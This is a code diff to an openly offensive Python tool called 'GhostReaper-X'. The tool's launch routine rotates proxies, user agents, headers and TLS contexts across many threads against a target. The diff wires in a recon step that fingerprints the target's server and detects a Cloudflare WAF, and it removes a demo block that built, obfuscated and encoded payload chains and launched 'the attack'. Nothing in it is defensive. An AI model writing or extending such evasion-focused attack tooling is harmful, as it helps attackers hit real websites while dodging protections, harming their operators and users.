@@ -353,6 +353,10 @@ def launch_ghost_sequence():
         load_proxies(proxy_file)
         load_user_agents(ua_file)
 
+        # Run recon after target is set
+        print(f"[✓] Running recon on {target} ...")
+        recon_target(target)
+
         def worker():
             local_headers = inject_headers()
             tls_context = rotate_tls_context()
@@ -395,7 +399,7 @@ def launch_ghost_sequence():
         if failover_monitoring:
             threading.Thread(target=monitor_target).start()
 
-        for thread in thread_pool :
+        for thread in thread_pool:
             thread.join()
 
         print("GhostReaper-X sequence terminated.")
@@ -442,46 +446,18 @@ def load_payload_chain(file_path):
         return [line.strip() for line in f]
 
 def recon_target(target):
-    conn = http.client.HTTPSConnection(urlparse(target).netloc)
-    conn.request("GET", "/")
-    res = conn.getresponse()
-    headers = dict(res.getheaders())
-    if "Server" in headers:
-        print(f"[+] Server fingerprint: {headers['Server']}")
-    if "cf-ray" in headers:
-        print("[+] Cloudflare WAF detected")
-
-# Example usage of additional functions
-if __name__ == "__main__":
-    # Recon target
-    recon_target(target)
-
-    # Build and save payload chain
-    payload_chain = build_payload_chain()
-    save_payload_chain('ghost_payloads.txt', payload_chain)
-
-    # Load and use payload chain
-    loaded_chain = load_payload_chain('ghost_payloads.txt')
-    for payload in loaded_chain:
-        decoded_payload = base64.b64decode(payload).decode()
-        print(f"Using payload: {decoded_payload}")
-        # Inject payload here
-
-    # Fetch online proxies
-    online_proxies = fetch_proxies_online()
-    print(f"Fetched {len(online_proxies)} proxies online.")
-
-    # Obfuscate a sample payload
-    sample_payload = mutate_payload("ghost-mutation")
-    obfuscated_payload = obfuscate(sample_payload)
-    print(f"Obfuscated payload: {obfuscated_payload}")
-
-    # Encode a sample payload
-    encoded_payload = encode_payload(sample_payload)
-    print(f"Encoded payload: {encoded_payload}")
-
-    # Launch the attack
-    launch_ghost_sequence()
+    try:
+        parsed = urlparse(target)
+        conn = http.client.HTTPSConnection(parsed.hostname, context=ssl.create_default_context())
+        conn.request("GET", "/")
+        res = conn.getresponse()
+        headers = dict(res.getheaders())
+        if "Server" in headers:
+            print(f"[+] Server fingerprint: {headers['Server']}")
+        if "cf-ray" in headers:
+            print("[+] Cloudflare WAF detected")
+    except Exception as e:
+        print(f"[!] Recon failed: {e}")
 
 # Banner functions
 def print_banner_brutal():
